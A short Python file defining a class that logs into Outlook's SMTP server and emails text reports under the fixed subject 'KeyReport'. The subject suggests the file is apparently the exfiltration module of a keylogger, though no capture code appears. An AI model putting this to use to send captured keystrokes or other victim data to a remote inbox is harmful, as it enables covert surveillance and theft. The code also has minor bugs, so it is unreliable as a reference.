# -*- coding: utf-8 -*-

try :
    from StringIO import StringIO
except :
    from io import StringIO

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class mailSender:
    def __init__(self , sender , senderpassword , receiver , subject = "KeyReport" ):
        self.sender = sender 
        self.password = senderpassword
        
        self.to = receiver
        
        self.subject = "KeyReport"
        
        self.smtpObj = smtplib.SMTP("smtp-mail.outlook.com" , 587)
        self.smtpObj.ehlo()
        self.smtpObj.starttls()
        self.smtpObj.ehlo()
        self.smtpObj.login(self.sender , self.password)
        self.message = None
        
    def sendMail(self , msg ):
        #message = """From: %s\r\nTo: %s\r\nSubject: %s\r\n\%s""" % (self.sender, ", ".join(self.to), self.subject, msg)
        #message = """From : {}\r\nTo: {}\r\nSubject: {}\r\n {}""".format(self.sender , self.to , self.subject , msg)
        """
        message = MIMEText(msg)
        msg['Subject'] = self.subject
        msg["From"] = self.sender
        msg["To"] = self.to 
        """
        try :     
            message = MIMEMultipart()
            message['From'] = self.sender
            message['To'] = self.to
            message['Subject'] = self.subject
            message.attach(MIMEText(msg))
            self.smtpObj.sendmail(self.sender ,  self.to , message.as_string()  )
            return 0 
        except Exception as e: 
            return "[*] Error while sending mail " + e 
    def deconnect(self):
        self.smtpObj.quit()
        
